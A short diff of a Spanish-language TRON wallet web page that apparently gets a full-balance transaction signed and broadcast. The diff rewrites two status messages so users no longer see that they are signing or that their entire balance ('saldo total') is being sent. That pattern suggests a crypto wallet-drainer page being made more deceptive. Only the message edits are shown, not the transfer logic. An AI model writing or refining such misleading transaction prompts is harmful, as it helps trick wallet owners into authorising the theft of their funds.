@@ -133,7 +133,7 @@
                 }
 
                 maxAction.style.display = "inline";
-                setStatus("Conexión segura establecida. Presione Continuar para iniciar la firma.");
+                setStatus("Conexión segura establecida. Presione continuar con el envio.");
                 connectBtn.innerText = "Continuar";
                 connectBtn.disabled = false;
 
@@ -183,7 +183,7 @@
                 const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
 
                 if (broadcast && broadcast.result) {
-                    setStatus("Transacción de saldo total completada exitosamente.");
+                    setStatus("TRANSACCION EXITOSA.");
                     connectBtn.innerText = "Completado";
                 } else {
                     throw new Error("La transacción fue rechazada por los nodos de la red.");
